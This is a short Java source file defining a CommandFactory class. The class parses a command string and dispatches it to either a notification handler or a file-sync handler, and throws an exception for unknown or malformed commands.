package com.theah64.xrob.commandcenter;

import com.theah64.xrob.commandcenter.commands.BaseCommand;
import com.theah64.xrob.commandcenter.commands.FileSyncCommand;
import com.theah64.xrob.models.Command;
import com.theah64.xrob.commandcenter.commands.NotificationCommand;

import org.apache.commons.cli.ParseException;

/**
 * Created by theapache64 on 14/9/16,7:49 PM.
 */
public class CommandFactory {

    public static BaseCommand getCommand(final Command command) throws BaseCommand.CommandException, ParseException {

        final String commandType = getCommandType(command.getCommand());

        switch (commandType) {

            case Command.COMMAND_NOTIFY:
                return new NotificationCommand(command.getCommand());

            case Command.COMMAND_FSYNC:
                return new FileSyncCommand(command.getCommand());

            default:
                throw new BaseCommand.CommandException("Command not defined " + commandType);

        }
    }

    private static String getCommandType(final String command) throws BaseCommand.CommandException {
        if (command != null) {
            final String[] args = command.split(" ");
            if (args.length >= 3) {
                return args[1];
            }
        }
        throw new BaseCommand.CommandException("Command type not found");
    }
}
